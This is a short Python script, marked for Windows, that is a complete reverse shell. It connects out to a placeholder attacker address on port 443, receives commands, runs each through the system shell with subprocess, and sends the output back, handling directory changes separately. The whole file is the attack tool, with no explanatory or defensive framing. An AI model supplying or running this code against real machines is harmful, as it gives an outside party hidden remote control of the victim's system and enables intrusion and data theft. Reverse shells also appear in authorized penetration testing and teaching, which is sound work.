# windows 
import socket as s
import subprocess as sp
import os

LHOST = 'IP_ADDRESS'
LPORT = 443
BUFFER_SIZE = 4096

client = s.socket(s.AF_INET, s.SOCK_STREAM)
client.connect((LHOST, LPORT))

while True:
    try:
        data = client.recv(BUFFER_SIZE)
        if not data:
            break

        command = data.decode().strip()

        if command.startswith("cd "):
            try:
                os.chdir(command[3:])
                client.send(b"\n")
            except Exception as e:
                client.send(str(e).encode())
            continue

        if command:
            try:
                output = sp.check_output(command, shell=True, stderr=sp.STDOUT)
            except sp.CalledProcessError as e:
                output = e.output

            client.send(output if output else b"\n")

    except Exception as e:
        client.send(f"error {e}\n".encode())

client.close()